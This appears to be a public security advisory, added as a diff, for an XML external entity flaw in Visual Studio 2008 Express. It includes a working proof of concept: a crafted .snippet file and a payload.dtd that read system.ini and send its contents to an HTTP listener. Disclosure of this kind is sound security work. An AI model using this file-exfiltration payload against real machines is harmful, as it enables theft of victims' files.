@@ -1,0 +1,113 @@
+# Exploit Title: Visual Studio 2008 - XML External Entity Injection
+# Discovery by: hyp3rlinx
+# Date: 2019-12-02
+# Vendor Homepage: www.microsoft.com
+# Software Link: Visual Studio 2008 Express IDE 
+# Tested Version: 2008
+# CVE: N/A
+
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-VISUAL-STUDIO-EXPRESS-2008-IDE-XML-EXTERNAL-ENTITY-0Day.txt
+[+] ISR: ApparitionSec          
+
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+Visual Studio 2008 Express IDE 
+vcsetup.exe
+File hash: 62f764849e8fcdf8bfbc342685641304
+Download: http://go.microsoft.com/?linkid=7729279
+
+
+[Vulnerability Type]
+XML External Entity Injection 0Day
+
+
+[CVE Reference]
+N/A
+
+
+[Security Issue]
+Visual Studio 2008 IDE suffers from XML External Entity injection. Attackers can leverage many file types, some being MASM related files like .asm or .lst.
+By opening any one of the following file types listed below, it can allow remote attackers to steal files from the victims computer, sending them to the
+remote attackers server. 
+
+Double click any of the following extensions and it will trigger the XXE vulnerability. Note, upon installation of the IDE the following file types get 
+associated with Visual Studio 2008 and are ALL vulnerable and will trigger the XXE exploit.
+
+[Vuln XXE file types]
+.snippet
+.i
+.s
+.asm
+.disco
+.lst
+.inc
+.srf
+.wsdl
+.rgs
+.xml
+
+This IDE is pretty old, I know, but its still available for download as of this writing, therefore I release the advisory.
+
+
+[References]
+https://devblogs.microsoft.com/visualstudio/end-of-support-for-visual-studio-2008-in-one-year/
+
+
+[Exploit/POC]
+"Evil.snippet" or any of the extensions mentioned above.
+
+<?xml version="1.0"?>
+<!DOCTYPE knobgobslob [ 
+<!ENTITY % file SYSTEM "C:\Windows\system.ini">
+<!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+
+"payload.dtd"
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8000?%file;'>">
+%all;
+
+
+python -m SimpleHTTPServer
+python -m http.server (Python3)
+
+
+[POC Video URL]
+https://www.youtube.com/watch?v=QOZlwzsbPrk
+
+
+
+[Network Access]
+Remote
+
+
+[Severity]
+High
+
+
+[Disclosure Timeline]
+Vendor Notification:  3/24/2017 
+MSRC sent me link to "Definition of a Security Vulnerability"
+Also Product is also not supported anymore.
+December 1, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
